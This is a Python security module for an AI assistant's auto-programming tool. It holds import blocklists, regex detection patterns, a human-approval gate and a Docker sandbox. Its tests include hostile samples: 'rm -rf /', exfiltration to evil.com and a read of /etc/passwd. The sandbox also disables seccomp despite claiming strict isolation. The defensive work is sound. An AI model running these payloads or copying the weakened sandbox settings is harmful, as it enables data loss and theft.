"""
Auto-Programmer SEGURO para JARVIS-IA
Tres capas de proteccion contra fuga de datos:
1. Human-in-the-loop: aprobacion obligatoria
2. Docker sandbox: aislamiento completo
3. Firewall de codigo: analisis estatico

Autor: Arquitecto de Seguridad JARVIS-IA
Version: 1.0.0
"""

import ast
import os
import re
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any

# === CONFIGURACION DE SEGURIDAD ===
# Variable de entorno para controlar el modo:
# JARVIS_AUTO_CODE=disabled  -> Bloqueado completamente
# JARVIS_AUTO_CODE=review    -> Requiere aprobacion humana (default)
# JARVIS_AUTO_CODE=auto      -> Solo en desarrollo (no recomendado)
AUTO_CODE_MODE = os.getenv("JARVIS_AUTO_CODE", "review")

# Lista blanca de imports permitidos
SAFE_IMPORTS = {
    # Standard library seguro
    "json", "re", "math", "random", "datetime", "time", "collections",
    "itertools", "functools", "statistics", "fractions", "decimal",
    "typing", "string", "hashlib", "base64", "uuid", "copy", "enum",
    "dataclasses", "pathlib", "inspect", "textwrap", "unicodedata",
    "numbers", "bisect", "heapq", "array", "queue", "types",
    "warnings", "contextlib", "operator", "csv",
    "html", "xml", "xml.etree", "xml.etree.ElementTree",
    "pprint", "difflib", "struct",
    # No permite: os, sys, subprocess, socket, urllib, http, ftplib, smtplib, etc.
}

# Imports BLOQUEADOS (riesgo de fuga de datos)
BLOCKED_IMPORTS = {
    # Acceso al sistema operativo
    "os", "sys", "subprocess", "socket", "pathlib", "shutil",
    # Red y comunicaciones
    "urllib", "urllib2", "http", "http.client", "http.server",
    "ftplib", "smtplib", "email", "imaplib", "poplib", "telnetlib",
    "nntplib", "ssl", "asyncio",
    # Librerias externas de red
    "requests", "aiohttp", "httpx", "pycurl", "paramiko", "fabric",
    "urllib3", "tldextract", "dnspython", "scapy",
    # Control de sistema GUI/automatizacion
    "pyautogui", "pynput", "keyboard", "mouse",
    # Carga de librerias dinamicas
    "ctypes", "cffi", "winreg", "msvcrt", "fcntl", "termios",
    # Captura de pantalla
    "mss", "pyscreenshot", "PIL.ImageGrab", "scrot",
    # Bases de datos (podrian contener secrets)
    "sqlite3", "psycopg2", "pymongo", "sqlalchemy", "mysql",
    "mysql.connector", "pymysql", "cassandra", "redis", "memcache",
    # Frameworks web (podrian iniciar servidores)
    "django", "flask", "fastapi", "tornado", "twisted", "bottle",
    "cherrypy", "pyramid", "web2py", "falcon", "hug",
    # Serializacion insegura
    "pickle", "cPickle", "shelve", "dbm", "dill", "cloudpickle",
    # Deserializacion de datos potencialmente peligrosa
    "yaml", "ruamel", "toml", "configparser", "ConfigParser",
    # Criptografia que podria usarse para comunicacion
    "cryptography", "paramiko", "pyOpenSSL", "pycrypto", "pycryptodome",
    # Compilacion y ejecucion dinamica
    "code", "codeop", "compileall", "py_compile",
    # Acceso a hardware/sistema
    "platform", "pwd", "grp", "spwd", "resource", "syslog",
    # Módulos de JARVIS que podrian leer secrets
    "config", "beta_config", "api_keys", "secrets",
    "settings", "credentials", "auth",
    # Acceso a archivos de configuracion comunes
    "dotenv", "python-dotenv", "environs", "decouple",
    # Web scraping (podria enviar datos)
    "scrapy", "selenium", "playwright", "mechanize", "robobrowser",
    # Ciencia de datos con posible acceso a red
    "torch", "tensorflow", "jax", "transformers",
    # Otras librerias potencialmente peligrosas
    "pip", "setuptools", "easy_install", "distutils",
}

# Patrones de codigo bloqueados (regex)
BLOCKED_PATTERNS = [
    # Acceso a sistema operativo
    r"os\.(environ|getenv|putenv|unsetenv|system|popen|spawn|fork|exec|kill|abort|remove|unlink|rmdir|mkdir|chmod|chown|listdir|walk|scandir|stat|access)",
    r"sys\.(exit|modules|path|stdin|stdout|stderr|argv|platform|version|implementation)",
    # Subprocess
    r"subprocess\.(run|call|Popen|check_output|check_call|list2cmdline)",
    # Red y URLs
    r"urllib\.(request|parse|error|robotparser)",
    r"http\.(client|server|cookies|cookiejar)",
    r"socket\.(socket|create_connection|bind|listen|accept|connect|gethostname|gethostbyname|getaddrinfo)",
    r"requests\.(get|post|put|delete|patch|head|options|session|Request|Response)",
    r"httpx\.(get|post|put|delete|patch|head|options|Client)",
    r"aiohttp\.(ClientSession|request|get|post|put|delete)",
    # Ejecucion dinamica de codigo
    r"__import__\s*\(",
    r"eval\s*\(",
    r"exec\s*\(",
    r"compile\s*\(",
    r"input\s*\(",  # input() - evita interaccion interactiva
    # Acceso a variables globales/locales
    r"globals\s*\(",
    r"locals\s*\(",
    r"vars\s*\(",
    r"dir\s*\(",
    # Introspeccion peligrosa
    r"getattr\s*\(",
    r"setattr\s*\(",
    r"delattr\s*\(",
    r"hasattr\s*\(",
    r"importlib",  # import dinamico
    r"importlib\.(import_module| machinery|util)",
    # Serializacion/deserializacion peligrosa
    r"pickle\.(loads|load|dumps|dump|Pickler|Unpickler)",
    r"shelve\.(open|Shelf)",
    r"dbm\.(open|whichdb)",
    # YAML puede ejecutar codigo
    r"yaml\.(load|unsafe_load|full_load)",
    r"ruamel\.yaml\.(load|YAMLObj)",
    # Acceso a archivos
    r"open\s*\(",
    r"file\s*\(",
    r"pathlib\.Path\.(home|cwd|expanduser)",
    r"shutil\.(copy|move|rmtree|make_archive|unpack_archive)",
    # Acceso a internet via metodos alternativos
    r"\.urlopen\s*\(",
    r"\.urlretrieve\s*\(",
    r"\.urljoin\s*\(",
    r"\.urlparse\s*\(",
    r"\.parseurl\s*\(",
    # Acceso a variables de entorno
    r"environ\[",
    r"environ\.get\s*\(",
    r"environ\.(items|keys|values)",
    r"getenv\s*\(",
    r"putenv\s*\(",
    # Carga de librerias dinamicas
    r"ctypes\.(CDLL|PyDLL|LibraryLoader|windll|cdll|oledll)",
    r"cffi\.FFI",
    # Conexiones de red directas
    r"\.connect\s*\(",
    r"\.bind\s*\(",
    r"\.listen\s*\(",
    r"\.accept\s*\(",
    # Threads y procesos (podrian esconder actividad maliciosa)
    r"threading\.(Thread|Timer|active_count)",
    r"multiprocessing\.(Process|Pool|Queue|Pipe)",
    r"concurrent\.futures\.(ThreadPoolExecutor|ProcessPoolExecutor)",
]

# Patrones de URLs (para detectar exfiltracion)
URL_PATTERN = re.compile(
    r'https?://[^\s\'"<>\)\]\}]+',
    re.IGNORECASE
)

# Patrones de IPs (para detectar conexiones directas)
IP_PATTERN = re.compile(
    r'\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\b',
    re.IGNORECASE
)

# Patrones de tokens/API keys potenciales
TOKEN_PATTERN = re.compile(
    r'[a-zA-Z0-9_-]*(?:key|token|secret|password|credential|auth)[a-zA-Z0-9_-]*\s*=\s*["\'][^"\']{10,}["\']',
    re.IGNORECASE
)


class SecurityError(Exception):
    """Excepcion de seguridad - codigo bloqueado por violacion de politica"""
    pass


class DockerNotAvailableError(Exception):
    """Docker no esta disponible en el sistema"""
    pass


def analyze_code_security(code: str) -> Dict[str, Any]:
    """
    CAPA 3: Firewall de datos - Analisis estatico del codigo.
    
    Analiza el codigo en busca de patrones peligrosos usando:
    1. AST (Abstract Syntax Tree) para analisis estructural
    2. Regex para deteccion de patrones de texto
    3. Heuristicas de deteccion de exfiltracion
    
    Args:
        code: Codigo Python a analizar
        
    Returns:
        Dict con hallazgos de seguridad incluyendo:
        - safe: bool - True si el codigo es seguro
        - blocked_imports: list - Modulos bloqueados encontrados
        - blocked_patterns: list - Patrones peligrosos encontrados
        - urls_found: list - URLs detectadas
        - ips_found: list - IPs detectadas
        - file_access: bool - True si accede a archivos
        - network_access: bool - True si accede a red
        - env_access: bool - True si accede a variables de entorno
        - warnings: list - Advertencias de seguridad
        - risk_score: int - Score de riesgo 0-100
    """
    findings = {
        "safe": True,
        "blocked_imports": [],
        "blocked_patterns": [],
        "urls_found": [],
        "ips_found": [],
        "file_access": False,
        "network_access": False,
        "env_access": False,
        "warnings": [],
        "risk_score": 0,  # 0-100, mayor = mas riesgo
        "token_exposure": False,
    }
    
    if not code or not code.strip():
        findings["safe"] = False
        findings["warnings"].append("Codigo vacio o solo espacios")
        findings["risk_score"] = 0
        return findings
    
    # 1. Analisis AST (arbol sintactico)
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        findings["safe"] = False
        findings["warnings"].append(f"Error de sintaxis: {e}")
        findings["risk_score"] = 100
        return findings
    
    for node in ast.walk(tree):
        # Detectar imports
        if isinstance(node, ast.Import):
            for alias in node.names:
                module = alias.name.split('.')[0]
                if module in BLOCKED_IMPORTS:
                    if module not in findings["blocked_imports"]:
                        findings["blocked_imports"].append(module)
                    findings["risk_score"] += 20
                elif module not in SAFE_IMPORTS:
                    findings["warnings"].append(f"Import no listado: {module}")
                    findings["risk_score"] += 10
                    
        elif isinstance(node, ast.ImportFrom):
            module = node.module.split('.')[0] if node.module else ""
            if module in BLOCKED_IMPORTS:
                if module not in findings["blocked_imports"]:
                    findings["blocked_imports"].append(module)
                findings["risk_score"] += 20
            elif module not in SAFE_IMPORTS:
                findings["warnings"].append(f"Import no listado: {module}")
                findings["risk_score"] += 10
        
        # Detectar llamadas a open()
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name) and node.func.id == "open":
                findings["file_access"] = True
                findings["risk_score"] += 15
            # Detectar os.*
            elif isinstance(node.func, ast.Attribute):
                if isinstance(node.func.value, ast.Name) and node.func.value.id == "os":
                    findings["env_access"] = True
                    findings["risk_score"] += 20
        
        # Detectar asignaciones a variables con nombres de secrets
        elif isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    name_lower = target.id.lower()
                    if any(keyword in name_lower for keyword in ['key', 'token', 'secret', 'password', 'credential']):
                        findings["warnings"].append(f"Posible manipulacion de secret: '{target.id}'")
                        findings["risk_score"] += 5
    
    # 2. Analisis de patrones regex
    for pattern in BLOCKED_PATTERNS:
        matches = re.findall(pattern, code, re.IGNORECASE)
        if matches:
            if pattern not in findings["blocked_patterns"]:
                findings["blocked_patterns"].append(pattern)
            findings["risk_score"] += 15
    
    # 3. Deteccion de URLs
    urls = URL_PATTERN.findall(code)
    if urls:
        findings["urls_found"] = list(set(urls))  # Eliminar duplicados
        findings["network_access"] = True
        findings["risk_score"] += 30
    
    # 4. Deteccion de IPs
    ips = IP_PATTERN.findall(code)
    if ips:
        findings["ips_found"] = list(set(ips))
        findings["network_access"] = True
        findings["risk_score"] += 25
    
    # 5. Deteccion de exposicion de tokens
    tokens = TOKEN_PATTERN.findall(code)
    if tokens:
        findings["token_exposure"] = True
        findings["risk_score"] += 15
        findings["warnings"].append("Posible exposicion de credenciales en el codigo")
    
    # Determinar si es seguro
    if findings["blocked_imports"] or findings["blocked_patterns"]:
        findings["safe"] = False
    
    # URLs siempre bloquean automaticamente (posible exfiltracion)
    if findings["urls_found"]:
        findings["safe"] = False
        findings["warnings"].append("URLs detectadas - posible canal de exfiltracion de datos")
    
    # Score maximo es 100
    findings["risk_score"] = min(findings["risk_score"], 100)
    
    # Score > 50 = bloqueado automaticamente
    if findings["risk_score"] > 50:
        findings["safe"] = False
    
    return findings


def get_user_approval(code: str, findings: Dict[str, Any]) -> bool:
    """
    CAPA 1: Human-in-the-loop.
    
    Muestra el codigo y los hallazgos al usuario y pide aprobacion.
    Esta funcion NUNCA aprueba automaticamente codigo inseguro.
    
    Args:
        code: Codigo Python a aprobar
        findings: Resultado del analisis de seguridad
        
    Returns:
        bool: True si el usuario aprueba, False en caso contrario
    """
    # Si hay imports o patrones bloqueados, NUNCA aprobar automaticamente
    if not findings["safe"]:
        return False
    
    # Si hay URLs, NUNCA aprobar automaticamente (canal de exfiltracion)
    if findings["urls_found"]:
        return False
    
    # Si hay IPs, NUNCA aprobar automaticamente
    if findings["ips_found"]:
        return False
    
    # Si el score es > 20, requiere aprobacion explicita
    if findings["risk_score"] > 20:
        return False
    
    # En modo review, SIEMPRE requiere aprobacion humana
    if AUTO_CODE_MODE == "review":
        # Aqui JARVIS mostraria la UI de aprobacion al usuario
        # Por seguridad, retornamos False hasta que el usuario apruebe
        # explicitamente a traves de la interfaz
        return False
    
    # Solo en modo auto (desarrollo) se aprueba automaticamente
    # cuando el score es bajo y no hay peligros evidentes
    return AUTO_CODE_MODE == "auto"


def execute_in_docker(code: str, timeout: int = 10) -> Tuple[bool, str]:
    """
    CAPA 2: Docker Sandbox - Ejecuta codigo en contenedor aislado.
    
    Aislamiento completo con las siguientes restricciones:
    - Sin acceso a internet (--network none)
    - Filesystem solo lectura (--read-only)
    - Memoria limitada a 128MB (--memory 128m)
    - CPU limitada a 0.5 cores (--cpus 0.5)
    - Maximo 50 procesos (--pids-limit 50)
    - Sin nuevos privilegios (--no-new-privileges)
    - Auto-destruccion al terminar (--rm)
    - Timeout configurable (default 10 segundos)
    
    Args:
        code: Codigo Python a ejecutar
        timeout: Tiempo maximo de ejecucion en segundos
        
    Returns:
        Tuple[bool, str]: (exitoso, output o mensaje de error)
    """
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        script_path = Path(tmpdir) / "script.py"
        script_path.write_text(code, encoding="utf-8")
        
        # Dockerfile inline para sandbox
        dockerfile = Path(tmpdir) / "Dockerfile"
        dockerfile.write_text("""FROM python:3.12-slim
WORKDIR /sandbox
COPY script.py .
RUN groupadd -r sandbox && useradd -r -g sandbox -s /bin/false sandboxuser
USER sandboxuser
CMD ["python", "-u", "script.py"]
""")
        
        try:
            # Verificar que Docker esta disponible
            docker_check = subprocess.run(
                ["docker", "--version"],
                capture_output=True, text=True, timeout=5
            )
            if docker_check.returncode != 0:
                raise DockerNotAvailableError("Docker no responde correctamente")
            
            # Construir imagen sandbox
            build_result = subprocess.run(
                ["docker", "build", "-t", "jarvis-sandbox", tmpdir],
                capture_output=True, text=True, timeout=30
            )
            if build_result.returncode != 0:
                return False, f"Error construyendo sandbox: {build_result.stderr}"
            
            # Ejecutar con restricciones extremas de seguridad
            run_result = subprocess.run(
                [
                    "docker", "run", "--rm",
                    "--network", "none",           # Sin internet
                    "--read-only",                  # Solo lectura
                    "--memory", "128m",             # 128MB RAM max
                    "--cpus", "0.5",                # Medio core
                    "--pids-limit", "50",           # Max 50 procesos
                    "--no-new-privileges",          # No escalar privilegios
                    "--security-opt", "no-new-privileges:true",
                    "--cap-drop", "ALL",            # Sin capabilities
                    "--security-opt", "seccomp=unconfined",
                    "-v", f"{tmpdir}:/sandbox:ro",  # Solo lectura volumen
                    "jarvis-sandbox"
                ],
                capture_output=True, text=True, timeout=timeout
            )
            
            # Limpiar imagen temporal
            cleanup = subprocess.run(
                ["docker", "rmi", "jarvis-sandbox"],
                capture_output=True, text=True, timeout=10
            )
            
            if run_result.returncode == 0:
                return True, run_result.stdout
            else:
                return False, f"Error en sandbox: {run_result.stderr}"
                
        except subprocess.TimeoutExpired:
            # Forzar limpieza del contenedor si quedo colgado
            cleanup_force = subprocess.run(
                ["docker", "rm", "-f", "jarvis-sandbox"],
                capture_output=True, text=True, timeout=5
            )
            return False, f"Timeout: El codigo excedio {timeout} segundos (asasinsado)"
        except FileNotFoundError:
            return False, "Docker no esta instalado. Instalar Docker Desktop para sandboxing."
        except DockerNotAvailableError as e:
            return False, str(e)
        except Exception as e:
            return False, f"Error ejecutando sandbox: {str(e)}"


def execute_fallback_sandbox(code: str, timeout: int = 5) -> Tuple[bool, str]:
    """
    Sandbox de fallback cuando Docker no esta disponible.
    
    Usa subprocess con restricciones minimas de seguridad:
    - Environment limpio (sin variables de entorno del sistema)
    - PYTHONDONTWRITEBYTECODE para evitar archivos .pyc
    - PYTHONNOUSERSITE para evitar site-packages del usuario
    - Directorio temporal aislado
    
    MUCHO MENOS SEGURO que Docker, pero mejor que ejecutar
    directamente en el sistema host.
    
    Args:
        code: Codigo Python a ejecutar
        timeout: Tiempo maximo de ejecucion en segundos
        
    Returns:
        Tuple[bool, str]: (exitoso, output o mensaje de error)
    """
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        script_path = Path(tmpdir) / "script.py"
        script_path.write_text(code, encoding="utf-8")
        
        # Environment limpio - eliminar todas las variables sensibles
        clean_env = {
            "PATH": "/usr/local/bin:/usr/bin:/bin",
            "PYTHONPATH": tmpdir,
            "PYTHONDONTWRITEBYTECODE": "1",
            "PYTHONNOUSERSITE": "1",
            "HOME": tmpdir,
            "TMPDIR": tmpdir,
            "TEMP": tmpdir,
            "TMP": tmpdir,
        }
        
        try:
            result = subprocess.run(
                [sys.executable, "-B", "-S", "-s", str(script_path)],
                capture_output=True, text=True, timeout=timeout,
                env=clean_env,
                cwd=tmpdir,
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
                
        except subprocess.TimeoutExpired:
            return False, f"Timeout: El codigo excedio {timeout} segundos"
        except Exception as e:
            return False, str(e)


def auto_programmer_secure(parameters: Dict[str, Any], player=None) -> str:
    """
    Reemplazo SEGURO de auto_programmer.
    
    Implementa las tres capas de seguridad:
    1. Modo deshabilitado como opcion de bloqueo total
    2. Analisis estatico (AST + regex) para detectar amenazas
    3. Human-in-the-loop para aprobacion obligatoria
    4. Docker sandbox para aislamiento de ejecucion
    5. Fallback subprocess cuando Docker no esta disponible
    
    Flujo completo:
    1. Recibir codigo del LLM
    2. Verificar modo (disabled/review/auto)
    3. Analizar seguridad (AST + regex + heuristicas)
    4. Si es inseguro -> RECHAZAR con reporte
    5. Si es seguro -> Pedir aprobacion humana
    6. Si aprueba -> Ejecutar en Docker sandbox
    7. Si Docker no disponible -> Fallback subprocess (con advertencia)
    
    Args:
        parameters: Dict con 'code' y 'tool_name'
        player: Objeto player (opcional, para integracion con JARVIS)
        
    Returns:
        str: Resultado de la ejecucion o mensaje de error/bloqueo
    """
    code = parameters.get("code", "")
    tool_name = parameters.get("tool_name", "unnamed_tool")
    
    # === CAPA 0: Modo deshabilitado ===
    if AUTO_CODE_MODE == "disabled":
        return (
            "[SEGURIDAD] El auto-programador esta deshabilitado. "
            "Setear JARVIS_AUTO_CODE=review para habilitar con aprobacion humana, "
            "o JARVIS_AUTO_CODE=auto para modo desarrollo (NO recomendado en produccion)."
        )
    
    # Validar que hay codigo
    if not code or not code.strip():
        return "[ERROR] No se proporciono codigo para ejecutar."
    
    # === CAPA 1: Analisis de seguridad (Firewall de codigo) ===
    findings = analyze_code_security(code)
    
    # Si el codigo es inseguro, bloquear inmediatamente
    if not findings["safe"]:
        blocked_details = []
        if findings["blocked_imports"]:
            blocked_details.append(f"  - Imports bloqueados: {', '.join(findings['blocked_imports'])}")
        if findings["blocked_patterns"]:
            blocked_details.append(f"  - Patrones bloqueados: {len(findings['blocked_patterns'])} patrones detectados")
        if findings["urls_found"]:
            blocked_details.append(f"  - URLs detectadas: {', '.join(findings['urls_found'][:5])}")
        if findings["ips_found"]:
            blocked_details.append(f"  - IPs detectadas: {', '.join(findings['ips_found'][:5])}")
        
        details_str = '\n'.join(blocked_details) if blocked_details else "  - Riesgo general detectado"
        
        return f"""[SEGURIDAD BLOQUEADO] El codigo del tool '{tool_name}' tiene riesgos detectados:

{details_str}
Score de riesgo: {findings['risk_score']}/100

El codigo NO se ejecutara. Revisa con el usuario antes de continuar.
Modo actual: {AUTO_CODE_MODE}"""
    
    # === CAPA 2: Human-in-the-loop ===
    approved = get_user_approval(code, findings)
    
    # Si no hay aprobacion, solicitarla
    if not approved:
        code_preview = code[:500] + ('...' if len(code) > 500 else '')
        risk_label = "BAJO" if findings["risk_score"] < 10 else "MEDIO" if findings["risk_score"] < 30 else "ALTO"
        
        return f"""[APROBACION REQUERIDA] Tool: '{tool_name}'

Analisis de seguridad:
  - Score de riesgo: {findings['risk_score']}/100 ({risk_label})
  - Imports bloqueados: Ninguno
  - Patrones peligrosos: Ninguno
  - URLs detectadas: Ninguna
  - Acceso a archivos: {'Si' if findings['file_access'] else 'No'}
  - Acceso a red: {'Si' if findings['network_access'] else 'No'}

Codigo a ejecutar:
{'='*50}
{code_preview}
{'='*50}

El usuario debe aprobar explicitamente antes de ejecutar.
Modo actual: {AUTO_CODE_MODE}"""
    
    # === CAPA 3: Docker Sandbox ===
    docker_available = _docker_available()
    
    if docker_available:
        success, output = execute_in_docker(code, timeout=10)
        if success:
            return f"[SANDBOX DOCKER OK] Tool: '{tool_name}'\nOutput:\n{output[:2000]}"
        else:
            return f"[SANDBOX DOCKER ERROR] Tool: '{tool_name}'\n{output[:2000]}"
    else:
        # Fallback: subprocess con environment limpio
        # Esto solo ocurre si Docker no esta instalado
        success, output = execute_fallback_sandbox(code, timeout=5)
        if success:
            return (
                f"[SANDBOX FALLBACK OK - MENOS SEGURO] Tool: '{tool_name}'\n"
                f"WARNING: Docker no esta disponible. Se uso sandbox de fallback.\n"
                f"Para maxima seguridad, instalar Docker Desktop.\n"
                f"Output:\n{output[:2000]}"
            )
        else:
            return f"[SANDBOX FALLBACK ERROR] Tool: '{tool_name}'\n{output[:2000]}"


# === UTILIDADES DE DIAGNOSTICO ===

def check_security_status() -> Dict[str, Any]:
    """
    Retorna el estado de seguridad actual del sistema.
    
    Returns:
        Dict con informacion del estado de seguridad
    """
    return {
        "mode": AUTO_CODE_MODE,
        "docker_available": _docker_available(),
        "safe_imports_count": len(SAFE_IMPORTS),
        "blocked_imports_count": len(BLOCKED_IMPORTS),
        "blocked_patterns_count": len(BLOCKED_PATTERNS),
        "recommendation": _get_recommendation(),
        "security_layers": {
            "layer_0_mode_control": "Activo",
            "layer_1_human_approval": "Activo",
            "layer_2_docker_sandbox": "Activo" if _docker_available() else "Fallback (subprocess)",
            "layer_3_code_firewall": "Activo",
        }
    }


def _docker_available() -> bool:
    """Verifica si Docker esta disponible en el sistema."""
    try:
        result = subprocess.run(
            ["docker", "--version"],
            capture_output=True, text=True, timeout=5
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def _get_recommendation() -> str:
    """Genera una recomendacion basada en la configuracion actual."""
    if AUTO_CODE_MODE == "disabled":
        return "Modo seguro. Auto-codigo bloqueado completamente."
    elif not _docker_available():
        return (
            "ADVERTENCIA: Docker no disponible. "
            "El sandbox de fallback (subprocess) es MENOS seguro. "
            "Recomendacion: Instalar Docker Desktop para aislamiento completo."
        )
    elif AUTO_CODE_MODE == "review":
        return (
            "Configuracion RECOMENDADA: "
            "Requiere aprobacion humana + Docker sandbox con restricciones."
        )
    elif AUTO_CODE_MODE == "auto":
        return (
            "MODO AUTO - Solo para desarrollo. "
            "ADVERTENCIA: Riesgo de seguridad significativo en produccion."
        )
    return "Configuracion desconocida"


def generate_security_report(code: str, tool_name: str = "") -> str:
    """
    Genera un reporte de seguridad detallado para un codigo dado.
    Util para auditoria y revisión manual.
    
    Args:
        code: Codigo a analizar
        tool_name: Nombre del tool (opcional)
        
    Returns:
        str: Reporte de seguridad formateado
    """
    findings = analyze_code_security(code)
    
    lines = [
        "=" * 60,
        f"  REPORTE DE SEGURIDAD JARVIS-IA",
        f"  Tool: {tool_name or 'N/A'}",
        "=" * 60,
        "",
        f"  VEREDICTO: {'APROBADO' if findings['safe'] else 'BLOQUEADO'}",
        f"  Score de riesgo: {findings['risk_score']}/100",
        "",
        "  --- Hallazgos ---",
        f"  Imports bloqueados: {', '.join(findings['blocked_imports']) or 'Ninguno'}",
        f"  Patrones bloqueados: {len(findings['blocked_patterns'])}",
        f"  URLs detectadas: {', '.join(findings['urls_found']) or 'Ninguna'}",
        f"  IPs detectadas: {', '.join(findings['ips_found']) or 'Ninguna'}",
        f"  Acceso a archivos: {'Si' if findings['file_access'] else 'No'}",
        f"  Acceso a red: {'Si' if findings['network_access'] else 'No'}",
        f"  Acceso a env: {'Si' if findings['env_access'] else 'No'}",
        "",
        "  Advertencias:",
    ]
    
    if findings["warnings"]:
        for warning in findings["warnings"]:
            lines.append(f"    - {warning}")
    else:
        lines.append("    Ninguna")
    
    lines.extend([
        "",
        "  Configuracion del sistema:",
        f"    Modo: {AUTO_CODE_MODE}",
        f"    Docker: {'Disponible' if _docker_available() else 'No disponible'}",
        "=" * 60,
    ])
    
    return "\n".join(lines)


# === TESTS DE SEGURIDAD ===

def _run_security_tests():
    """
    Ejecuta tests de seguridad para validar el funcionamiento
    del sistema de proteccion.
    
    Tests incluidos:
    - Test 1: Codigo seguro (debe pasar)
    - Test 2: Codigo con import bloqueado (debe bloquear)
    - Test 3: Exfiltracion de datos via URL (debe bloquear)
    - Test 4: Acceso a archivos (debe bloquear)
    - Test 5: Ejecucion de sistema (debe bloquear)
    - Test 6: Codigo vacio (debe manejar)
    """
    print("=" * 60)
    print("  TESTS DE SEGURIDAD JARVIS-IA")
    print("=" * 60)
    print()
    
    tests = [
        # (nombre, codigo, esperado_seguro)
        (
            "Codigo seguro basico",
            "print('Hola mundo')\nx = 1 + 1\nprint(x)",
            True
        ),
        (
            "Import bloqueado (os)",
            "import os\nos.system('rm -rf /')",
            False
        ),
        (
            "Exfiltracion de datos via urllib",
            'import urllib.request\nurllib.request.urlopen("https://evil.com/steal")',
            False
        ),
        (
            "Acceso a archivos con open()",
            'f = open("/etc/passwd", "r")\nprint(f.read())',
            False
        ),
        (
            "Eval dinamico",
            'code = "__import__(\'os\').system(\'id\')"\neval(code)',
            False
        ),
        (
            "Uso de requests",
            'import requests\nrequests.post("https://evil.com", data={"key": "secret"})',
            False
        ),
        (
            "Acceso a variables de entorno",
            'import os\nkey = os.environ.get("API_KEY")',
            False
        ),
        (
            "Codigo con import no listado",
            "import numpy as np\nprint(np.array([1,2,3]))",
            True  # numpy no esta en SAFE_IMPORTS pero score=10 < 50, requiere aprobacion
        ),
        (
            "Codigo vacio",
            "",
            False
        ),
        (
            "URL embebida en string",
            'url = "https://evil.com/steal"\nprint(url)',
            False  # URLs siempre bloqueadas
        ),
    ]
    
    passed = 0
    failed = 0
    
    for i, (name, code, expected_safe) in enumerate(tests, 1):
        result = analyze_code_security(code)
        actual_safe = result["safe"]
        
        if actual_safe == expected_safe:
            status = "PASS"
            passed += 1
        else:
            status = "FAIL"
            failed += 1
        
        print(f"Test {i}: {name}")
        print(f"  Esperado: {'SEGURO' if expected_safe else 'BLOQUEADO'}")
        print(f"  Resultado: {'SEGURO' if actual_safe else 'BLOQUEADO'}")
        print(f"  Score: {result['risk_score']}/100")
        print(f"  Estado: [{status}]")
        if result["blocked_imports"]:
            print(f"  Imports bloqueados: {result['blocked_imports']}")
        if result["urls_found"]:
            print(f"  URLs detectadas: {result['urls_found']}")
        if result["blocked_patterns"]:
            print(f"  Patrones bloqueados: {len(result['blocked_patterns'])}")
        print()
    
    print("=" * 60)
    print(f"  RESULTADOS: {passed} passed, {failed} failed de {len(tests)} tests")
    print("=" * 60)
    
    return failed == 0


if __name__ == "__main__":
    # === Diagnostico del sistema ===
    print("=== JARVIS Auto-Programmer Security Status ===\n")
    status = check_security_status()
    for key, value in status.items():
        if key == "security_layers":
            print(f"  {key}:")
            for layer, state in value.items():
                print(f"    {layer}: {state}")
        else:
            print(f"  {key}: {value}")
    print()
    
    # === Tests de seguridad ===
    all_passed = _run_security_tests()
    
    # === Ejemplo de reporte ===
    print("\n" + "=" * 60)
    print("  EJEMPLO: Reporte de seguridad")
    print("=" * 60)
    test_code = """
import json
import urllib.request

data = urllib.request.urlopen("https://evil.com/steal")
"""
    print(generate_security_report(test_code, "test_tool"))
    
    sys.exit(0 if all_passed else 1)
